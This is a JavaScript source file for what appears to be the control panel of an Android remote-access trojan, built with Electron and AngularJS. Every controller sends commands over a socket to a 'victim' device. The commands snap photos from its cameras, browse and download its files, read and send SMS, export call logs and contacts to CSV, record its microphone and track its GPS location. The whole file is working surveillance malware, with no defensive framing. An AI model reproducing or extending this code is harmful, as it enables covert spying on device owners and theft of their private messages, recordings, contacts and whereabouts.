const { remote } = require('electron');
const { ipcRenderer } = require('electron');
var app = angular.module('myappy', ['ngRoute', 'infinite-scroll']);
var fs = require("fs-extra");
const CONSTANTS = require(__dirname + '/assets/js/Constants')
var ORDER = CONSTANTS.order;
var socket = remote.getCurrentWebContents().victim;
var homedir = require('node-homedir');
var path = require("path");

var dataPath = path.join(homedir(), CONSTANTS.dataDir);
var downloadsPath = path.join(dataPath, CONSTANTS.downloadPath);
var outputPath = path.join(dataPath, CONSTANTS.outputApkPath);

//-----------------------Routing Config------------------------
app.config(function ($routeProvider) {
    $routeProvider
        .when("/", {
            templateUrl: "./views/main.html"
        })
        .when("/camera", {
            templateUrl: "./views/camera.html",
            controller: "CamCtrl"
        })
        .when("/fileManager", {
            templateUrl: "./views/fileManager.html",
            controller: "FmCtrl"
        })
        .when("/smsManager", {
            templateUrl: "./views/smsManager.html",
            controller: "SMSCtrl"
        })
        .when("/callsLogs", {
            templateUrl: "./views/callsLogs.html",
            controller: "CallsCtrl"
        })
        .when("/contacts", {
            templateUrl: "./views/contacts.html",
            controller: "ContCtrl"
        })
        .when("/mic", {
            templateUrl: "./views/mic.html",
            controller: "MicCtrl"
        })
        .when("/location", {
            templateUrl: "./views/location.html",
            controller: "LocCtrl"
        });
});

//-----------------------LAB Controller (lab.htm)------------------------
// controller for Lab.html and its views mic.html,camera.html..etc
app.controller("LabCtrl", function ($scope, $rootScope, $location) {
    $labCtrl = $scope;
    var log = document.getElementById("logy");
    $labCtrl.logs = [];

    const window = remote.getCurrentWindow();
    $labCtrl.close = () => {
        window.close();
    };

    $labCtrl.maximize = () => {
        if (window.isMaximized()) {
            window.unmaximize(); // Restore the window size
        } else {
            window.maximize(); // Maximize the window
        }
    };

    $rootScope.Log = (msg, status) => {
        var fontColor = CONSTANTS.logColors.DEFAULT;
        if (status == CONSTANTS.logStatus.SUCCESS)
            fontColor = CONSTANTS.logColors.GREEN;
        else if (status == CONSTANTS.logStatus.FAIL)
            fontColor = CONSTANTS.logColors.RED;

        $labCtrl.logs.push({ date: new Date().toLocaleString(), msg: msg, color: fontColor });
        log.scrollTop = log.scrollHeight;
        if (!$labCtrl.$$phase)
            $labCtrl.$apply();
    }

    ipcRenderer.on('SocketIO:VictimDisconnected', (event) => {
        $rootScope.Log('Victim Disconnected', CONSTANTS.logStatus.FAIL);
    });

    ipcRenderer.on('SocketIO:ServerDisconnected', (event) => {
        $rootScope.Log('[¡] Server Disconnected', CONSTANTS.logStatus.INFO);
    });

    $labCtrl.goToPage = (page) => {
        $location.path('/' + page);
    }
});

//-----------------------Camera Controller (camera.htm)------------------------
// camera controller
app.controller("CamCtrl", function ($scope, $rootScope) {
    $camCtrl = $scope;
    $camCtrl.isSaveShown = false;
    var camera = CONSTANTS.orders.camera;

    $camCtrl.$on('$destroy', () => {
        socket.removeAllListeners(camera);
    });

    $rootScope.Log('Get cameras list');
    $camCtrl.load = 'loading';
    socket.emit(ORDER, { order: camera, extra: 'camList' });

    socket.on(camera, (data) => {
        if (data.camList == true) {
            $rootScope.Log('Cameras list arrived', CONSTANTS.logStatus.SUCCESS);
            $camCtrl.cameras = data.list;
            $camCtrl.load = '';
            $camCtrl.selectedCam = $camCtrl.cameras[1];
            $camCtrl.$apply();
        } else if (data.image == true) {
            $rootScope.Log('Picture arrived', CONSTANTS.logStatus.SUCCESS);
            var uint8Arr = new Uint8Array(data.buffer);
            var binary = '';
            for (var i = 0; i < uint8Arr.length; i++) {
                binary += String.fromCharCode(uint8Arr[i]);
            }
            var base64String = window.btoa(binary);
            $camCtrl.imgUrl = 'data:image/png;base64,' + base64String;
            $camCtrl.isSaveShown = true;
            $camCtrl.$apply();
            $camCtrl.savePhoto = () => {
                $rootScope.Log('Saving picture..');
                var picPath = path.join(downloadsPath, Date.now() + ".jpg");
                fs.outputFile(picPath, new Buffer(base64String, "base64"), (err) => {
                    if (!err)
                        $rootScope.Log('Picture saved on ' + picPath, CONSTANTS.logStatus.SUCCESS);
                    else
                        $rootScope.Log('Saving picture failed', CONSTANTS.logStatus.FAIL);
                });
            }
        }
    });

    $camCtrl.snap = () => {
        $rootScope.Log('Snap a picture');
        socket.emit(ORDER, { order: camera, extra: $camCtrl.selectedCam.id });
    }
});

//-----------------------File Controller (fileManager.htm)------------------------
// File controller
app.controller("FmCtrl", function ($scope, $rootScope) {
    $fmCtrl = $scope;
    $fmCtrl.load = 'loading';
    $fmCtrl.files = [];
    var fileManager = CONSTANTS.orders.fileManager;

    $fmCtrl.$on('$destroy', () => {
        socket.removeAllListeners(fileManager);
    });

    $fmCtrl.barLimit = 30;
    $fmCtrl.increaseLimit = () => {
        $fmCtrl.barLimit += 30;
    }

    $rootScope.Log('Get files list');
    socket.emit(ORDER, { order: fileManager, extra: 'ls', path: '/storage/emulated/0/' });

    socket.on(fileManager, (data) => {
        if (data.file == true) {
            $rootScope.Log('Saving file..');
            var filePath = path.join(downloadsPath, data.name);
            fs.outputFile(filePath, data.buffer, (err) => {
                if (err)
                    $rootScope.Log('Saving file failed', CONSTANTS.logStatus.FAIL);
                else
                    $rootScope.Log('File saved on ' + filePath, CONSTANTS.logStatus.SUCCESS);
            });
        } else if (data.length != 0) {
            $rootScope.Log('Files list arrived', CONSTANTS.logStatus.SUCCESS);
            $fmCtrl.load = '';
            $fmCtrl.files = data;
            $fmCtrl.$apply();
        } else {
            $rootScope.Log('That directory is inaccessible (Access denied)', CONSTANTS.logStatus.FAIL);
            $fmCtrl.load = '';
            $fmCtrl.$apply();
        }
    });

    $fmCtrl.getFiles = (file) => {
        if (file != null) {
            $fmCtrl.load = 'loading';
            $rootScope.Log('Get ' + file);
            socket.emit(ORDER, { order: fileManager, extra: 'ls', path: '/' + file });
        }
    };

    $fmCtrl.saveFile = (file) => {
        $rootScope.Log('Downloading ' + '/' + file);
        socket.emit(ORDER, { order: fileManager, extra: 'dl', path: '/' + file });
    }
});

//-----------------------SMS Controller (sms.htm)------------------------
// SMS controller
app.controller("SMSCtrl", function ($scope, $rootScope) {
    $SMSCtrl = $scope;
    var sms = CONSTANTS.orders.sms;
    $SMSCtrl.smsList = [];
    $('.menu .item')
        .tab();

    $SMSCtrl.$on('$destroy', () => {
        socket.removeAllListeners(sms);
    });

    $SMSCtrl.getSMSList = () => {
        $SMSCtrl.load = 'loading';
        $SMSCtrl.barLimit = 50;
        $rootScope.Log('Get SMS list..');
        socket.emit(ORDER, { order: sms, extra: 'ls' });
    }

    $SMSCtrl.increaseLimit = () => {
        $SMSCtrl.barLimit += 50;
    }

    $SMSCtrl.SendSMS = (phoneNo, msg) => {
        $rootScope.Log('Sending SMS..');
        socket.emit(ORDER, { order: sms, extra: 'sendSMS', to: phoneNo, sms: msg });
    }

    $SMSCtrl.SaveSMS = () => {
        if ($SMSCtrl.smsList.length == 0)
            return;
        var csvRows = [];
        for (var i = 0; i < $SMSCtrl.smsList.length; i++) {
            csvRows.push($SMSCtrl.smsList[i].phoneNo + "," + $SMSCtrl.smsList[i].msg);
        }
        var csvStr = csvRows.join("\n");
        var csvPath = path.join(downloadsPath, "SMS_" + Date.now() + ".csv");
        $rootScope.Log("Saving SMS List...");
        fs.outputFile(csvPath, csvStr, (error) => {
            if (error)
                $rootScope.Log("Saving " + csvPath + " Failed", CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log("SMS List Saved on " + csvPath, CONSTANTS.logStatus.SUCCESS);
        });
    }

    socket.on(sms, (data) => {
        if (data.smsList) {
            $SMSCtrl.load = '';
            $rootScope.Log('SMS list arrived', CONSTANTS.logStatus.SUCCESS);
            $SMSCtrl.smsList = data.smsList;
            $SMSCtrl.smsSize = data.smsList.length;
            $SMSCtrl.$apply();
        } else {
            if (data == true)
                $rootScope.Log('SMS sent', CONSTANTS.logStatus.SUCCESS);
            else
                $rootScope.Log('SMS not sent', CONSTANTS.logStatus.FAIL);
        }
    });
});

//-----------------------Calls Controller (callslogs.htm)------------------------
// Calls controller
app.controller("CallsCtrl", function ($scope, $rootScope) {
    $CallsCtrl = $scope;
    $CallsCtrl.callsList = [];
    var calls = CONSTANTS.orders.calls;

    $CallsCtrl.$on('$destroy', () => {
        socket.removeAllListeners(calls);
    });

    $CallsCtrl.load = 'loading';
    $rootScope.Log('Get Calls list..');
    socket.emit(ORDER, { order: calls });

    $CallsCtrl.barLimit = 50;
    $CallsCtrl.increaseLimit = () => {
        $CallsCtrl.barLimit += 50;
    }

    $CallsCtrl.SaveCalls = () => {
        if ($CallsCtrl.callsList.length == 0)
            return;
        var csvRows = [];
        for (var i = 0; i < $CallsCtrl.callsList.length; i++) {
            var type = (($CallsCtrl.callsList[i].type) == 1 ? "INCOMING" : "OUTGOING");
            var name = (($CallsCtrl.callsList[i].name) == null ? "Unknown" : $CallsCtrl.callsList[i].name);
            csvRows.push($CallsCtrl.callsList[i].phoneNo + "," + name + "," + $CallsCtrl.callsList[i].duration + "," + type);
        }
        var csvStr = csvRows.join("\n");
        var csvPath = path.join(downloadsPath, "Calls_" + Date.now() + ".csv");
        $rootScope.Log("Saving Calls List...");
        fs.outputFile(csvPath, csvStr, (error) => {
            if (error)
                $rootScope.Log("Saving " + csvPath + " Failed", CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log("Calls List Saved on " + csvPath, CONSTANTS.logStatus.SUCCESS);
        });
    }

    socket.on(calls, (data) => {
        if (data.callsList) {
            $CallsCtrl.load = '';
            $rootScope.Log('Calls list arrived', CONSTANTS.logStatus.SUCCESS);
            $CallsCtrl.callsList = data.callsList;
            $CallsCtrl.logsSize = data.callsList.length;
            $CallsCtrl.$apply();
        }
    });
});

//-----------------------Contacts Controller (contacts.htm)------------------------
// Contacts controller
app.controller("ContCtrl", function ($scope, $rootScope) {
    $ContCtrl = $scope;
    $ContCtrl.contactsList = [];
    var contacts = CONSTANTS.orders.contacts;

    $ContCtrl.$on('$destroy', () => {
        socket.removeAllListeners(contacts);
    });

    $ContCtrl.load = 'loading';
    $rootScope.Log('Get Contacts list..');
    socket.emit(ORDER, { order: contacts });

    $ContCtrl.barLimit = 50;
    $ContCtrl.increaseLimit = () => {
        $ContCtrl.barLimit += 50;
    }

    $ContCtrl.SaveContacts = () => {
        if ($ContCtrl.contactsList.length == 0)
            return;
        var csvRows = [];
        for (var i = 0; i < $ContCtrl.contactsList.length; i++) {
            csvRows.push($ContCtrl.contactsList[i].phoneNo + "," + $ContCtrl.contactsList[i].name);
        }
        var csvStr = csvRows.join("\n");
        var csvPath = path.join(downloadsPath, "Contacts_" + Date.now() + ".csv");
        $rootScope.Log("Saving Contacts List...");
        fs.outputFile(csvPath, csvStr, (error) => {
            if (error)
                $rootScope.Log("Saving " + csvPath + " Failed", CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log("Contacts List Saved on " + csvPath, CONSTANTS.logStatus.SUCCESS);
        });
    }

    socket.on(contacts, (data) => {
        if (data.contactsList) {
            $ContCtrl.load = '';
            $rootScope.Log('Contacts list arrived', CONSTANTS.logStatus.SUCCESS);
            $ContCtrl.contactsList = data.contactsList;
            $ContCtrl.contactsSize = data.contactsList.length;
            $ContCtrl.$apply();
        }
    });
});

//-----------------------Mic Controller (mic.htm)------------------------
// Mic controller
app.controller("MicCtrl", function ($scope, $rootScope) {
    $MicCtrl = $scope;
    $MicCtrl.isAudio = true;
    var mic = CONSTANTS.orders.mic;

    $MicCtrl.$on('$destroy', function () {
        socket.removeAllListeners(mic);
    });

    $MicCtrl.Record = (seconds) => {
        if (seconds) {
            if (seconds > 0) {
                $rootScope.Log('Recording ' + seconds + "'s...");
                socket.emit(ORDER, { order: mic, sec: seconds });
            } else
                $rootScope.Log('Seconds must be more than 0');
        }
    }

    socket.on(mic, (data) => {
        if (data.file == true) {
            $rootScope.Log('Audio arrived', CONSTANTS.logStatus.SUCCESS);
            var player = document.getElementById('player');
            var sourceMp3 = document.getElementById('sourceMp3');
            var uint8Arr = new Uint8Array(data.buffer);
            var binary = '';
            for (var i = 0; i < uint8Arr.length; i++) {
                binary += String.fromCharCode(uint8Arr[i]);
            }
            var base64String = window.btoa(binary);
            $MicCtrl.isAudio = false;
            $MicCtrl.$apply();
            sourceMp3.src = "data:audio/mp3;base64," + base64String;
            player.load();
            player.play();

            $MicCtrl.SaveAudio = () => {
                $rootScope.Log('Saving file..');
                var filePath = path.join(downloadsPath, data.name);
                fs.outputFile(filePath, data.buffer, (err) => {
                    if (err)
                        $rootScope.Log('Saving file failed', CONSTANTS.logStatus.FAIL);
                    else
                        $rootScope.Log('File saved on ' + filePath, CONSTANTS.logStatus.SUCCESS);
                });
            };
        }
    });
});

//-----------------------Location Controller (location.htm)------------------------
// Location controller
app.controller("LocCtrl", function ($scope, $rootScope) {
    $LocCtrl = $scope;
    var location = CONSTANTS.orders.location;

    $LocCtrl.$on('$destroy', () => {
        socket.removeAllListeners(location);
    });

    var map = L.map('mapid').setView([51.505, -0.09], 13);
    L.tileLayer('http://{s}.tile.osm.org/{z}/{x}/{y}.png', {}).addTo(map);

    $LocCtrl.Refresh = () => {
        $LocCtrl.load = 'loading';
        $rootScope.Log('Get Location..');
        socket.emit(ORDER, { order: location });
    }

    $LocCtrl.load = 'loading';
    $rootScope.Log('Get Location..');
    socket.emit(ORDER, { order: location });

    var marker;
    socket.on(location, (data) => {
        $LocCtrl.load = '';
        if (data.enable) {
            if (data.lat == 0 && data.lng == 0)
                $rootScope.Log('Try to Refresh', CONSTANTS.logStatus.FAIL);
            else {
                $rootScope.Log('Location arrived => ' + data.lat + "," + data.lng, CONSTANTS.logStatus.SUCCESS);
                var victimLoc = new L.LatLng(data.lat, data.lng);
                if (!marker)
                    var marker = L.marker(victimLoc).addTo(map);
                else
                    marker.setLatLng(victimLoc).update();
                map.panTo(victimLoc);
            }
        } else
            $rootScope.Log('Location Service is not enabled on Victim\'s Device', CONSTANTS.logStatus.FAIL);
    });
});
